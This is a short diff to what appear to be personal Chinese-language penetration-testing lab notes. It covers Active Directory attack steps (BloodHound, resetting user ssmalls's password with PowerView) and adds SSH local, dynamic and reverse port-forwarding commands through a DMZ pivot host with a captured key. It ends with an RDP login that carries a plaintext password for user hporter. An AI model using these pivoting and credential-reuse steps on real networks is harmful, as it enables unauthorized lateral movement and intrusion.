@@ -372,5 +372,9 @@ bloodhound      打开GUI
 如果整个组对某台主机拥有本地管理员权限 (local admin rights)，是一个高风险发现
 使用 PowerView 来更改 ssmalls 的密码
 
-ssh -i dmz01_key -L 13389:172.16.8.20:3389 root@10.129.203.111            本地 13389 -> 枢纽 3389 -> 目标
+ssh -i dmz01_key -L 13389:172.16.8.20:3389 root@10.129.203.111            本地 13389 -> 枢纽 3389 -> 目标  （仅一个目标）      本地 -> 远程单一
+  对比
+  ssh -i dmz01_key -D 1080 root@10.129.203.111                             本地 13389 -> 枢纽 任意 -> 目标  （整个内网）        本地 -> 任意
+  ssh -i dmz01_key -R 8080:127.0.0.1:80 root@10.129.203.111                枢纽 8080 -> 本地 80                               远程 -> 本地
 
+xfreerdp /v:127.0.0.1:13389 /u:hporter /p:Gr8hambino! /drive:home,"/home/tester/tools"
